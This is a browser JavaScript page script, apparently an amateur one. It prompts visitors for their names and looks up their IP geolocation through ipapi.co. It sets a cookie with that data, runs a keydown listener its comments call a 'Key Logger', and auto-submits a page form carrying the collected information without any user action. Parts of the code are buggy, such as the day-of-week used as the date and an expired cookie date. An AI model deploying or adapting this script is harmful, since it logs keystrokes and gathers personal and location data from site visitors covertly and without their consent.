var userFirstName, userLastName, user, d, m, time, cookieValue, userInformation, cookieInfoUpperStr, windowInfo, ipLook, log, keysPressed, leavingInfo, userMessage;

function cookieString(len, charSet) {
    charSet = charSet || 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789~!@#$%^&*()_+=-`';
    var cookieString = '';
    for (var i = 0; i < len; i++) {
        var randomPoz = Math.floor(Math.random() * charSet.length);
        cookieString += charSet.substring(randomPoz, randomPoz + 1);
    }
    return cookieString;
}

function cookie() {
    // User's Input Information
    userFirstName = window.prompt('Please enter your first name: ');
    userLastName = window.prompt('Please enter your last name: ');
    user = { first_name: userFirstName, last_name: userLastName };
    cookieValue = cookieString(32);
    // User's given data
    d = new Date();
    m = {
        0: 'Jan',
        1: 'Feb',
        2: 'March',
        3: 'April',
        4: 'May',
        5: 'June',
        6: 'Jul',
        7: 'Aug',
        8: 'Sept',
        9: 'Oct',
        10: 'Nov',
        11: 'Dec'
    };
    time = {
        year: d.getFullYear(),
        month: m[d.getMonth()],
        day: d.getDay(),
        hour: d.getHours(),
        minutes: d.getMinutes(),
        seconds: d.getSeconds()
    };
    ///////////////////////////// Extra Info
    h = window.innerHeight || document.documentElement.clientHeight || document.body.clientHeight;
    w = window.innerWidth || document.documentElement.clientWidth || document.body.clientWidth;
    windowInfo = { Height: h, Width: w };

    $.getJSON('https://ipapi.co/json/', function (data) {
        ipLook = JSON.stringify(data, null, 2);
        userInformation = { user_name: user, cookie_value: cookieValue, current_time: time, window_information: windowInfo, ip_info: ipLook };
        console.log(userInformation);
        // Real browser cookie
        cookieInfoUpperStr = JSON.stringify(userInformation); // Makes the cookie not [object Object]
        document.cookie = 'cookie=' + cookieInfoUpperStr + ';expires=Thu, 26 Mar 2020 15:26:23 GMT;path=/';
        // 
    });

    ///////////////////////////// End Extra Info

}

function setVisit() {
    // Key Logger
    log = document.documentElement;
    keysPressed = []
    document.addEventListener('keydown', logKey);
    function logKey(e) {
        keysPressed.push(log = ` ${e.code}`);
        console.log(keysPressed);
    }
    // End key-logger

    if (document.cookie.length < 1) {
        cookie();
        document.getElementById('userNameFirst').value = 'DNR';
        document.getElementById('emailBox').value = 'DNR@robot.com';
        document.getElementById('textarea').value = cookieInfoUpperStr;
        document.getElementById('submit').click();
        window.onunload = function unload() {
            leavingInfo = { leaving_time: time, window_information: windowInfo }
            userMessage = document.getElementById('textarea').value;
            document.getElementById('textarea').value = '';
            document.getElementById('textarea').value = userMessage, keysPressed;
        }
    }
}
